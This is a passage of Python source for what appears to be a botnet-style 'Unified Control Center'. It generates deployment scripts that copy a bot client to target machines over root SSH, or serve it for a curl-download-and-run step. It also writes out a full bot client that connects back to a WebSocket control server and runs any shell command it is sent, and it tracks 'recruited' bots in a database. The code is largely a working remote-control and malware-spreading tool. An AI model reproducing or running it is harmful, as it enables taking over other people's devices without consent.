        scp /tmp/linux_bot.py root@{target_ip}:/tmp/bot.py
        ssh root@{target_ip} 'cd /tmp && python3 bot.py --server ws://{current_host}:{current_ws_port} --token {current_token} --id linux-{target_ip.replace(".", "-")} --tags linux,recruited &'
        echo "🚀 Bot deployed on Linux device {target_ip}"
    else
        echo "❌ SSH connection failed to {target_ip}"
    fi
else
    echo "⚠️  SSH not available"
fi

# Method 2: HTTP deployment
echo "🌐 Setting up HTTP deployment method..."
python3 -m http.server 8080 --directory /tmp &
HTTP_PID=$!
echo "📡 Bot client available at: http://{current_host}:8080/linux_bot.py"
echo "📋 Manual deployment command for {target_ip}:"
echo "   curl -o bot.py http://{current_host}:8080/linux_bot.py && python3 bot.py --server ws://{current_host}:{current_ws_port} --token {current_token} --id manual-{target_ip.replace(".", "-")}"

# Cleanup after 5 minutes
sleep 300 && kill $HTTP_PID 2>/dev/null &
"""
        
        # Store recruitment attempt in persistent storage
        if persistent_storage:
            try:
                conn = sqlite3.connect(persistent_storage.db_path)
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT OR REPLACE INTO recruited_bots 
                    (bot_id, target_ip, target_os, recruitment_time, status, deployment_script)
                    VALUES (?, ?, ?, ?, ?, ?)
                """, (
                    f"{target_os}-{target_ip.replace('.', '-')}",
                    target_ip,
                    target_os,
                    time.time(),
                    "script_generated",
                    script
                ))
                conn.commit()
                conn.close()
            except Exception as e:
                logging.error(f"Failed to store recruitment data: {e}")
        
        return script
    
    def _generate_bot_client_code(self) -> str:
        """Generate functional bot client Python code"""
        return f'''#!/usr/bin/env python3
"""
Unified Control Bot Client - Auto-generated
Connects to control server and executes commands
"""

import asyncio
import json
import logging
import os
import sys
import time
import argparse
import subprocess
import psutil
import socket
import uuid

try:
    import websockets
except ImportError:
    print("Installing websockets...")
    subprocess.run([sys.executable, "-m", "pip", "install", "websockets", "psutil"])
    import websockets

class BotClient:
    def __init__(self, server_url, token, bot_id=None, tags=None):
        self.server_url = server_url
        self.token = token
        self.bot_id = bot_id or f"bot-{{socket.gethostname()}}-{{int(time.time())}}"
        self.tags = tags or ["recruited"]
        self.websocket = None
        self.running = True
        
    async def connect(self):
        """Connect to control server"""
        try:
            self.websocket = await websockets.connect(
                f"{{self.server_url}}?token={{self.token}}&id={{self.bot_id}}&tags={{','.join(self.tags)}}"
            )
            print(f"✅ Connected to server as {{self.bot_id}}")
            await self.register_device()
            return True
        except Exception as e:
            print(f"❌ Connection failed: {{e}}")
            return False
    
    async def register_device(self):
        """Register this device with the server"""
        try:
            # Get system info
            system_info = {{
                "hostname": socket.gethostname(),
                "platform": sys.platform,
                "cpu_count": psutil.cpu_count(),
                "memory_total": psutil.virtual_memory().total,
                "disk_usage": psutil.disk_usage('/').total if os.path.exists('/') else 0
            }}
            
            await self.websocket.send(json.dumps({{
                "type": "register",
                "device_id": self.bot_id,
                "tags": self.tags,
                "exec_allowed": True,
                "system_info": system_info
            }}))
        except Exception as e:
            print(f"Registration failed: {{e}}")
    
    async def handle_message(self, message):
        """Handle incoming server messages"""
        try:
            data = json.loads(message)
            msg_type = data.get("type")
            
            if msg_type == "command":
                result = await self.execute_command(data.get("command", ""))
                await self.send_response("command_result", result)
            elif msg_type == "terminal_command":
                result = await self.execute_terminal_command(data.get("command", ""))
                await self.send_response("terminal_result", result)
            elif msg_type == "ping":
                await self.send_response("pong", {{"timestamp": time.time()}})
                
        except Exception as e:
            print(f"Message handling error: {{e}}")
    
    async def execute_command(self, command):
        """Execute system command"""
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30
            )
            return {{
                "success": True,
                "output": result.stdout,
                "error": result.stderr,
                "return_code": result.returncode
            }}
        except Exception as e:
            return {{
                "success": False,
                "error": str(e)
            }}
    
    async def execute_terminal_command(self, command):
        """Execute terminal command with enhanced output"""
        return await self.execute_command(command)
    
    async def send_response(self, response_type, data):
        """Send response back to server"""
        try:
            await self.websocket.send(json.dumps({{
                "type": response_type,
                "device_id": self.bot_id,
                "timestamp": time.time(),
                "data": data
            }}))
        except Exception as e:
            print(f"Failed to send response: {{e}}")
    
    async def heartbeat(self):
        """Send periodic heartbeat"""
        while self.running:
            try:
                await asyncio.sleep(30)
                if self.websocket:
                    await self.websocket.send(json.dumps({{
                        "type": "heartbeat",
                        "device_id": self.bot_id,
                        "timestamp": time.time(),
                        "system_status": {{
                            "cpu_percent": psutil.cpu_percent(),
                            "memory_percent": psutil.virtual_memory().percent,
                            "disk_percent": psutil.disk_usage('/').percent if os.path.exists('/') else 0
                        }}
                    }}))
            except Exception as e:
                print(f"Heartbeat failed: {{e}}")
                break
    
    async def run(self):
        """Main bot execution loop"""
        while self.running:
            try:
                if await self.connect():
                    # Start heartbeat
                    heartbeat_task = asyncio.create_task(self.heartbeat())
                    
                    # Listen for messages
                    async for message in self.websocket:
                        await self.handle_message(message)
                        
                except websockets.exceptions.ConnectionClosed:
                    print("Connection closed, attempting reconnect...")
                    await asyncio.sleep(5)
                except Exception as e:
                    print(f"Error: {{e}}")
                    await asyncio.sleep(5)

def main():
    parser = argparse.ArgumentParser(description="Bot Client")
    parser.add_argument("--server", required=True, help="WebSocket server URL")
    parser.add_argument("--token", required=True, help="Authentication token")
    parser.add_argument("--id", help="Bot ID")
    parser.add_argument("--tags", nargs="*", default=["recruited"], help="Bot tags")
    
    args = parser.parse_args()
    
    bot = BotClient(args.server, args.token, args.id, args.tags)
    
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        print("Bot stopped by user")

if __name__ == "__main__":
    main()
'''

# Enhanced Terminal Interface
class TerminalInterface:
    """Advanced terminal interface with direct command execution"""
    
    def __init__(self):
        self.command_history = []
        self.active_sessions = {}
    
    async def execute_terminal_command(self, target: str, command: str, user_context: str = "web") -> Dict:
        """Execute real terminal command across targets like actual terminal"""
        try:
            # Parse target specification
            target_spec = parse_target_spec(target)
            matching_clients = await get_matching_clients(target_spec)
            
            # If no connected devices, execute locally as fallback
            if not matching_clients:
                if target_spec["type"] == "all" or target == "🌐 ALL DEVICES":
                    local_result = await self._execute_locally(command, user_context)
                    results = [local_result]
                else:
                    return {"error": "No matching devices found", "results": []}
            else:
                # Execute command on all matching clients
                results = []
                for client_id in matching_clients:
                    try:
                        result = await self._execute_on_device(client_id, command, user_context)
                        results.append({
                            "device_id": client_id,
                            "success": result.get("success", False),
                            "output": result.get("output", ""),
                            "error": result.get("error", "")
                        })
                    except Exception as e:
                        results.append({
                            "device_id": client_id, 
                            "success": False,
                            "error": str(e)
                        })
            
            # Log to command history and persistent storage
            self.command_history.append({
                "timestamp": time.time(),
                "target": target,
                "command": command,
                "results_count": len(results),
                "user_context": user_context
            })
            
            # Log to persistent storage if available
            if persistent_storage:
                success = all(r.get("success", False) for r in results)
                combined_output = "\n".join([r.get("output", "") for r in results])
                combined_errors = "\n".join([r.get("error", "") for r in results if r.get("error")])
                execution_time = sum([r.get("execution_time", 0) for r in results])
                
                persistent_storage.log_command_execution(
                    session_id=user_context,
                    target=target,
                    command=command,
                    success=success,
                    output=combined_output,
                    error=combined_errors,
                    execution_time=execution_time,
                    device_count=len(results)
                )
            
            return {"results": results, "command": command, "target": target}
            
        except Exception as e:
            return {"error": str(e), "results": []}
    
    async def _execute_on_device(self, device_id: str, command: str, user_context: str) -> Dict:
        """Execute command on specific device with full terminal capabilities"""
        async with clients_lock:
            if device_id not in clients:
                return {"success": False, "error": "Device not connected"}
            
            client = clients[device_id]
            
            # Check if this is a local device (control bot)
            if client.get("local_device", False):
                # Execute locally for control bot
                return await self._execute_locally(command, user_context)
            
            try:
                # Send terminal command to remote device
                await client["websocket"].send(json.dumps({
                    "type": "terminal_command",
                    "command": command,
                    "timeout": EXEC_TIMEOUT,
                    "user_context": user_context,
                    "shell": True  # Use real shell
                }))
                
                # Log the command execution
                db.log_audit(device_id, "terminal_command", command, "sent", user_context)
                
                return {"success": True, "status": "sent"}
                
            except Exception as e:
                return {"success": False, "error": str(e)}
    
    async def _execute_locally(self, command: str, user_context: str) -> Dict:
        """Execute command locally when no devices are connected"""
        try:
            import subprocess
            import os
            
            # Security check - prevent dangerous commands
            dangerous_commands = ["rm -rf", "format", "del /", "shutdown", "reboot", "halt"]
            for dangerous in dangerous_commands:
                if dangerous in command.lower():
                    return {
                        "device_id": "localhost", 
                        "success": False, 
                        "error": f"Command '{dangerous}' is blocked for security"
                    }
            
            # Execute command with timeout
            start_time = time.time()
            try:
                result = subprocess.run(
                    command, 
                    shell=True, 
                    capture_output=True, 
                    text=True, 
                    timeout=30,  # 30 second timeout for local commands
                    env=os.environ.copy()
                )
                
                execution_time = time.time() - start_time
                output = result.stdout if result.stdout else ""
                error = result.stderr if result.stderr else ""
                
                # Combine output and error for display
                combined_output = output
                if error:
                    combined_output += f"\n[STDERR]: {error}"
                
                return {
                    "device_id": "localhost",
                    "success": result.returncode == 0,
                    "output": combined_output,
                    "error": "" if result.returncode == 0 else f"Exit code: {result.returncode}",
                    "execution_time": execution_time
                }
                
            except subprocess.TimeoutExpired:
                return {
                    "device_id": "localhost",
                    "success": False,
                    "error": "Command timed out after 30 seconds"
                }
            except Exception as e:
                return {
                    "device_id": "localhost",
                    "success": False,
                    "error": str(e)
                }
                
        except Exception as e:
            return {
                "device_id": "localhost",
                "success": False,
                "error": f"Local execution failed: {str(e)}"
            }

# Enhanced Resource Optimization
class ResourceOptimizer:
    """Advanced resource optimization to prevent device damage"""
    
    def __init__(self):
        self.optimization_profile = None
        self.safety_limits = {}
    
    def create_optimization_profile(self) -> Dict:
        """Create comprehensive optimization profile"""
        try:
            # Get detailed system information
            ram_total = psutil.virtual_memory().total / (1024**3)
            ram_available = psutil.virtual_memory().available / (1024**3)
            cpu_count = psutil.cpu_count()
            cpu_percent = psutil.cpu_percent(interval=1)
            
            # Battery information (if available)
            battery = None
            try:
                battery = psutil.sensors_battery()
            except:
                pass
            
            # Disk information
            disk = psutil.disk_usage('/')
            disk_free_gb = disk.free / (1024**3)
            
            # Create safety profile
            profile = {
                "ram": {
                    "total_gb": ram_total,
                    "available_gb": ram_available,
                    "safe_usage_gb": min(ram_available * 0.7, 2.0),  # Use max 70% or 2GB
                    "safety_threshold": 0.85  # Never exceed 85% total RAM
                },
                "cpu": {
                    "cores": cpu_count,
                    "current_usage": cpu_percent,
                    "safe_usage_percent": min(80, 95 - cpu_percent),  # Adaptive based on current load
                    "safety_threshold": 90  # Never exceed 90% CPU
                },
                "disk": {
                    "free_gb": disk_free_gb,
                    "safe_usage_gb": min(disk_free_gb * 0.8, 5.0),  # Use max 80% or 5GB
                    "safety_threshold": 0.9  # Never exceed 90% disk
                },
                "battery": {
                    "present": battery is not None,
                    "percent": battery.percent if battery else 100,
                    "power_plugged": battery.power_plugged if battery else True,
                    "safe_operation": battery.percent > 20 if battery else True
                },
                "recommendations": []
            }
            
            # Generate recommendations
            if profile["battery"]["present"] and profile["battery"]["percent"] < 30:
                profile["recommendations"].append("Low battery: Reduce intensive operations")
            
            if profile["cpu"]["current_usage"] > 70:
                profile["recommendations"].append("High CPU usage: Limit concurrent operations")
            
            if profile["ram"]["available_gb"] < 1:
                profile["recommendations"].append("Low RAM: Reduce memory-intensive operations")
            
            # Update global limits based on profile
            global MAX_MEMORY_MB, MAX_CONCURRENT_COMMANDS, MAX_DEVICES
            MAX_MEMORY_MB = min(MAX_MEMORY_MB, int(profile["ram"]["safe_usage_gb"] * 1024))
            
            if profile["battery"]["present"] and not profile["battery"]["power_plugged"]:
                # On battery power, reduce limits
                MAX_CONCURRENT_COMMANDS = min(MAX_CONCURRENT_COMMANDS, cpu_count * 2)
                MAX_DEVICES = min(MAX_DEVICES, 100)
            
            self.optimization_profile = profile
            return profile
            
        except Exception as e:
            return {"error": str(e)}

# Global instances
device_manager = DeviceManager()
service_manager = ServiceManager()
device_discoverer = DeviceDiscoverer()
terminal_interface = TerminalInterface()
resource_optimizer = ResourceOptimizer()

class PersistentStorage:
    """Enhanced persistent storage system for logs, progress, and user data"""
    
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.init_enhanced_schema()
    
    def init_enhanced_schema(self):
        """Initialize enhanced database schema with all required tables"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Enhanced audit logs table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS audit_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp REAL NOT NULL,
                    device_id TEXT NOT NULL,
                    action TEXT NOT NULL,
                    details TEXT,
                    result TEXT,
                    user_context TEXT,
                    session_id TEXT,
                    ip_address TEXT,
                    execution_time REAL
                )
            """)
            
            # User sessions and progress tracking
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS user_sessions (
                    session_id TEXT PRIMARY KEY,
                    user_token TEXT NOT NULL,
                    start_time REAL NOT NULL,
                    last_activity REAL NOT NULL,
                    commands_executed INTEGER DEFAULT 0,
                    devices_accessed TEXT,
                    status TEXT DEFAULT 'active'
                )
            """)
            
            # Command history with enhanced metadata
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS command_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp REAL NOT NULL,
                    session_id TEXT,
                    target TEXT NOT NULL,
                    command TEXT NOT NULL,
                    success BOOLEAN,
                    output TEXT,
                    error TEXT,
                    execution_time REAL,
                    device_count INTEGER
                )
            """)
            
            # System performance and resource tracking
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS system_metrics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp REAL NOT NULL,
                    cpu_percent REAL,
                    memory_percent REAL,
                    disk_usage REAL,
                    active_connections INTEGER,
                    load_average TEXT,
                    battery_percent INTEGER
                )
            """)
            
            # Device recruitment and bot tracking
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS recruited_bots (
                    bot_id TEXT PRIMARY KEY,
                    target_ip TEXT NOT NULL,
                    target_os TEXT,
                    recruitment_time REAL NOT NULL,
                    status TEXT DEFAULT 'pending',
                    last_contact REAL,
                    capabilities TEXT,
                    deployment_script TEXT
                )
            """)
            
            # Configuration and settings storage
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS system_config (
                    key TEXT PRIMARY KEY,
                    value TEXT NOT NULL,
                    updated_time REAL NOT NULL,
                    category TEXT DEFAULT 'general'
                )
            """)
            
            # Create indexes for better performance
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_audit_device ON audit_logs(device_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_logs(timestamp)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_session_token ON user_sessions(user_token)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_command_session ON command_history(session_id)")
            cursor.execute("CREATE INDEX IF NOT EXISTS idx_metrics_timestamp ON system_metrics(timestamp)")
            
            conn.commit()
            conn.close()
            
            logging.info("Enhanced database schema initialized successfully")
            
        except Exception as e:
            logging.error(f"Database initialization failed: {e}")
    
    def log_command_execution(self, session_id: str, target: str, command: str, 
                            success: bool, output: str = "", error: str = "", 
                            execution_time: float = 0, device_count: int = 0):
        """Log command execution with enhanced metadata"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO command_history 
                (timestamp, session_id, target, command, success, output, error, execution_time, device_count)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (time.time(), session_id, target, command, success, output, error, execution_time, device_count))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logging.error(f"Failed to log command execution: {e}")
    
    def track_system_metrics(self):
        """Record current system metrics for monitoring"""
        try:
            # Get system metrics with fallbacks for restricted environments
            cpu_percent = None
            try:
                cpu_percent = psutil.cpu_percent(interval=0)  # Non-blocking call
            except (PermissionError, OSError):
                # Fallback if /proc/stat is not accessible
                cpu_percent = 0.0
            
            memory_percent = None
            try:
                memory = psutil.virtual_memory()
                memory_percent = memory.percent
            except (PermissionError, OSError):
                memory_percent = 0.0
            
            disk_percent = None
            try:
                disk = psutil.disk_usage('/')
                disk_percent = disk.percent
            except (PermissionError, OSError):
                disk_percent = 0.0
            
            # Get battery info if available
            battery_percent = None
            try:
                battery = psutil.sensors_battery()
                battery_percent = battery.percent if battery else None
            except:
                pass
            
            # Get load average (Unix only)
            load_avg = None
            try:
                load_avg = os.getloadavg()
                load_avg = f"{load_avg[0]:.2f}, {load_avg[1]:.2f}, {load_avg[2]:.2f}"
            except:
                pass
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO system_metrics 
                (timestamp, cpu_percent, memory_percent, disk_usage, active_connections, load_average, battery_percent)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (
                time.time(),
                cpu_percent,
                memory_percent,
                disk_percent,
                len(clients),
                load_avg,
                battery_percent
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            # Only log at debug level to avoid spam in logs
            logging.debug(f"Failed to track system metrics: {e}")
    
    def register_user_session(self, session_id: str, user_token: str) -> bool:
        """Register new user session"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT OR REPLACE INTO user_sessions 
                (session_id, user_token, start_time, last_activity)
                VALUES (?, ?, ?, ?)
            """, (session_id, user_token, time.time(), time.time()))
            
            conn.commit()
            conn.close()
            return True
            
        except Exception as e:
            logging.error(f"Failed to register user session: {e}")
            return False
    
    def update_session_activity(self, session_id: str):
        """Update session last activity timestamp"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                UPDATE user_sessions 
                SET last_activity = ?, commands_executed = commands_executed + 1
                WHERE session_id = ?
            """, (time.time(), session_id))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logging.error(f"Failed to update session activity: {e}")
    
    def get_system_stats(self) -> Dict:
        """Get comprehensive system statistics"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Get recent metrics (last hour)
            hour_ago = time.time() - 3600
            cursor.execute("""
                SELECT AVG(cpu_percent), AVG(memory_percent), AVG(disk_usage), COUNT(*)
                FROM system_metrics WHERE timestamp > ?
            """, (hour_ago,))
            
            metrics = cursor.fetchone()
            
            # Get command statistics
            cursor.execute("""
                SELECT COUNT(*), 
                       SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END),
                       AVG(execution_time),
                       COUNT(DISTINCT session_id)
                FROM command_history WHERE timestamp > ?
            """, (hour_ago,))
            
            command_stats = cursor.fetchone()
            
            # Get active sessions
            cursor.execute("""
                SELECT COUNT(*) FROM user_sessions 
                WHERE last_activity > ? AND status = 'active'
            """, (time.time() - 300,))  # Last 5 minutes
            
            active_sessions = cursor.fetchone()[0]
            
            conn.close()
            
            return {
                "avg_cpu_percent": metrics[0] or 0,
                "avg_memory_percent": metrics[1] or 0,
                "avg_disk_usage": metrics[2] or 0,
                "metrics_count": metrics[3] or 0,
                "total_commands": command_stats[0] or 0,
                "successful_commands": command_stats[1] or 0,
                "avg_execution_time": command_stats[2] or 0,
                "unique_sessions": command_stats[3] or 0,
                "active_sessions": active_sessions,
                "success_rate": (command_stats[1] / command_stats[0] * 100) if command_stats[0] else 0
            }
            
        except Exception as e:
            logging.error(f"Failed to get system stats: {e}")
            return {}

# Global storage instance
persistent_storage = None

async def initialize_control_bot():
    """Initialize the local device as the control/master bot"""
    try:
        import socket
        import platform
        
        # Get local system information
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        # Create STABLE control bot ID (no timestamp so it's consistent across restarts)
        control_bot_id = f"control-{hostname}"
        
        # Add to clients as master bot
        async with clients_lock:
            clients[control_bot_id] = {
                "websocket": None,  # Local device doesn't need websocket
                "meta": {
                    "tags": ["control", "master", "admin", "local"],
                    "exec_allowed": True,
                    "system_info": {
                        "hostname": hostname,
                        "platform": platform.platform(),
                        "ip_address": local_ip,
                        "cpu_count": psutil.cpu_count(),
                        "memory_total": psutil.virtual_memory().total,
                        "python_version": platform.python_version()
                    }
                },
                "last_seen": time.time(),
                "registered_at": time.time(),
                "command_count": 0,
                "local_device": True  # Mark as local device
            }
        
        # Also add to database for persistence
        db.add_device(
            control_bot_id,
            ["control", "master", "admin", "local"],
            True  # exec_allowed
        )
        
        # Store in persistent storage
        if persistent_storage:
            try:
                conn = sqlite3.connect(persistent_storage.db_path)
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT OR REPLACE INTO recruited_bots 
                    (bot_id, target_ip, target_os, recruitment_time, status, capabilities)
                    VALUES (?, ?, ?, ?, ?, ?)
                """, (
                    control_bot_id,
                    local_ip,
                    platform.system().lower(),
                    time.time(),
                    "active_control",
                    json.dumps(["control", "master", "admin", "terminal", "file_management"])
                ))
                conn.commit()
                conn.close()
            except Exception as e:
                logging.error(f"Failed to store control bot: {e}")
        
        logging.info(f"Control bot initialized: {control_bot_id} ({hostname}@{local_ip})")
        print(f"🤖 Control Bot initialized: {control_bot_id}")
        
    except Exception as e:
        logging.error(f"Failed to initialize control bot: {e}")
        print(f"❌ Failed to initialize control bot: {e}")
resource_optimizer = ResourceOptimizer()

def safe_mkdir(path: str):
    """Safely create directory"""
    os.makedirs(path, exist_ok=True)

def validate_device_id(device_id: str) -> bool:
    """Validate device ID format"""
    return len(device_id) <= 64 and device_id.replace('-', '').replace('_', '').isalnum()

def parse_target_spec(target: str) -> Dict:
    """Parse target specification (id:dev-1, tag:alpha, all)"""
    if target == "all":
        return {"type": "all"}
    elif target.startswith("id:"):
        return {"type": "id", "value": target[3:]}
    elif target.startswith("tag:"):
        return {"type": "tag", "value": target[4:]}
    else:
        return {"type": "id", "value": target}  # Default to ID

async def get_matching_clients(target_spec: Dict) -> List[str]:
    """Get client IDs matching target specification"""
    matches = []
    async with clients_lock:
        for client_id, client_info in clients.items():
            if target_spec["type"] == "all":
                matches.append(client_id)
            elif target_spec["type"] == "id" and client_id == target_spec["value"]:
                matches.append(client_id)
            elif target_spec["type"] == "tag":
                client_tags = client_info["meta"].get("tags", [])
                if target_spec["value"] in client_tags:
                    matches.append(client_id)
    return matches

class SandboxedExecutor:
    """Secure sandboxed execution environment"""
    
    @staticmethod
    def execute_file(file_path: str, args: List[str] = None) -> Dict:
        """Execute file in sandboxed environment"""
        if not os.path.exists(file_path):
            return {"success": False, "error": "File not found"}
        
        args = args or []
        start_time = time.time()
        
        try:
            # Create temporary directory for execution
            with tempfile.TemporaryDirectory() as temp_dir:
                # Copy file to temp directory
                temp_file = os.path.join(temp_dir, os.path.basename(file_path))
                with open(file_path, 'rb') as src, open(temp_file, 'wb') as dst:
                    dst.write(src.read())
                
                # Make executable if it's a script
                os.chmod(temp_file, 0o755)
                
                # Determine execution command
                if file_path.endswith('.py'):
                    cmd = ['python3', temp_file] + args
                elif file_path.endswith('.sh'):
                    cmd = ['bash', temp_file] + args
                else:
                    cmd = [temp_file] + args
                
                # Execute with limits
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=temp_dir,
                    preexec_fn=os.setsid if os.name != 'nt' else None
                )
                
                # Monitor resource usage
                def kill_if_exceeded():
                    try:
                        p = psutil.Process(process.pid)
                        while process.poll() is None:
                            if time.time() - start_time > EXEC_TIMEOUT:
                                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                                return
                            
                            if p.cpu_percent() > MAX_CPU_PERCENT:
                                logging.warning(f"Process {process.pid} exceeded CPU limit")
                            
                            if p.memory_info().rss > MAX_MEMORY_MB * 1024 * 1024:
                                logging.warning(f"Process {process.pid} exceeded memory limit")
                                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                                return
                            
                            time.sleep(0.5)
                    except (psutil.NoSuchProcess, ProcessLookupError):
                        pass
                
                monitor_thread = threading.Thread(target=kill_if_exceeded, daemon=True)
                monitor_thread.start()
                
                try:
                    stdout, stderr = process.communicate(timeout=EXEC_TIMEOUT)
                    returncode = process.returncode
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    except ProcessLookupError:
                        pass
                    stdout, stderr = process.communicate()
                    returncode = -1
                
                # Limit output size
                if len(stdout) > MAX_OUTPUT_SIZE:
                    stdout = stdout[:MAX_OUTPUT_SIZE] + b"... (truncated)"
                if len(stderr) > MAX_OUTPUT_SIZE:
                    stderr = stderr[:MAX_OUTPUT_SIZE] + b"... (truncated)"
                
                execution_time = time.time() - start_time
                
                return {
                    "success": returncode == 0,
                    "returncode": returncode,
                    "stdout": stdout.decode('utf-8', errors='replace'),
                    "stderr": stderr.decode('utf-8', errors='replace'),
                    "execution_time": execution_time
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "execution_time": time.time() - start_time
            }

# WebSocket server for device communication
async def handle_client(websocket):
    """Handle WebSocket client connection"""
    client_id = None
    try:
        # Authentication handshake
        auth_msg = await websocket.recv()
        auth_data = json.loads(auth_msg)
        
        if auth_data.get("token") != AUTH_TOKEN:
            await websocket.send(json.dumps({"error": "unauthorized"}))
            return
        
        client_id = auth_data.get("device_id")
        if not client_id or not validate_device_id(client_id):
            await websocket.send(json.dumps({"error": "invalid device_id"}))
            return
        
        # Register client
        async with clients_lock:
            if len(clients) >= MAX_DEVICES:
                await websocket.send(json.dumps({"error": "max_devices_reached"}))
                return
            
            clients[client_id] = {
                "websocket": websocket,
                "meta": auth_data.get("meta", {}),
                "last_seen": time.time(),
                "authenticated": True
            }
        
        # Update database
        db.add_device(
            client_id,
            auth_data.get("meta", {}).get("tags", []),
            auth_data.get("meta", {}).get("exec_allowed", False),
            auth_data.get("meta", {})
        )
        
        logging.info(f"Device {client_id} connected")
        await websocket.send(json.dumps({"status": "connected", "device_id": client_id}))
        
        # Handle messages
        async for message in websocket:
            try:
                data = json.loads(message)
                await handle_device_message(client_id, data)
            except json.JSONDecodeError:
                logging.warning(f"Invalid JSON from {client_id}")
            except Exception as e:
                logging.error(f"Error handling message from {client_id}: {e}")
    
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        logging.error(f"WebSocket error: {e}")
    finally:
        if client_id:
            async with clients_lock:
                clients.pop(client_id, None)
            logging.info(f"Device {client_id} disconnected")

async def handle_device_message(client_id: str, data: Dict):
    """Handle message from device"""
    msg_type = data.get("type")
    
    if msg_type == "heartbeat":
        async with clients_lock:
            if client_id in clients:
                clients[client_id]["last_seen"] = time.time()
        db.update_device_last_seen(client_id)
    
    elif msg_type == "command_result":
        # Log command execution result
        db.log_audit(
            client_id,
            "command_executed",
            data.get("command", ""),
            json.dumps(data.get("result", {})),
            "device"
        )
        logging.info(f"Command result from {client_id}: {data.get('result', {}).get('success', False)}")

async def send_command_to_spec(target: str, command: str) -> Dict:
    """Send command to devices matching target specification"""
    target_spec = parse_target_spec(target)
    matching_clients = await get_matching_clients(target_spec)
    
    if not matching_clients:
        return {"error": "no_matching_devices", "target": target}
    
    results = {}
    async with clients_lock:
        for client_id in matching_clients:
            if client_id not in clients:
                continue
            
            client = clients[client_id]
            websocket = client["websocket"]
            
            try:
                # Special handling for run_upload command
                if command.startswith("run_upload:"):
                    upload_id = command.split(":", 1)[1]
                    upload_info = db.get_upload(upload_id)
                    
                    if not upload_info:
                        results[client_id] = {"error": "upload_not_found"}
                        continue
                    
                    # Check if device allows execution
                    if not client["meta"].get("exec_allowed", False):
                        results[client_id] = {"error": "execution_not_allowed"}
                        continue
                    
                    # Send run_upload command with file URL
                    file_url = f"http://{HOST}:{HTTP_PORT}/files/{upload_id}?token={AUTH_TOKEN}"
                    cmd_data = {
                        "type": "run_upload",
                        "upload_id": upload_id,
                        "file_url": file_url,
                        "filename": upload_info["filename"],
                        "sha256": upload_info["sha256"]
                    }
                else:
                    cmd_data = {
                        "type": "command",
                        "command": command
                    }
                
                await websocket.send(json.dumps(cmd_data))
                results[client_id] = {"status": "sent"}
                
                # Log audit
                db.log_audit(client_id, "command_sent", command, "sent", "server")
                
            except Exception as e:
                results[client_id] = {"error": str(e)}
                logging.error(f"Failed to send command to {client_id}: {e}")
    
    return {"results": results, "target": target, "command": command}

# HTTP server and web UI
UI_HTML = r"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 Unified Control Center - Advanced Device Management</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%); 
            color: #00ff9f; 
            overflow-x: hidden; 
            font-size: 14px;
        }
        
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.1;
            background: radial-gradient(circle at 20% 50%, #00ff9f 0%, transparent 50%), 
                        radial-gradient(circle at 80% 20%, #ff0080 0%, transparent 50%),
                        radial-gradient(circle at 40% 80%, #0080ff 0%, transparent 50%);
        }
        
        header { 
            background: linear-gradient(90deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%);
            padding: 1rem 2rem; 
            border-bottom: 2px solid #00ff9f;
            box-shadow: 0 4px 20px rgba(0, 255, 159, 0.3);
            position: relative;
            z-index: 100;
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            text-shadow: 0 0 10px #00ff9f;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { text-shadow: 0 0 10px #00ff9f; }
            50% { text-shadow: 0 0 20px #00ff9f, 0 0 30px #00ff9f; }
        }
        
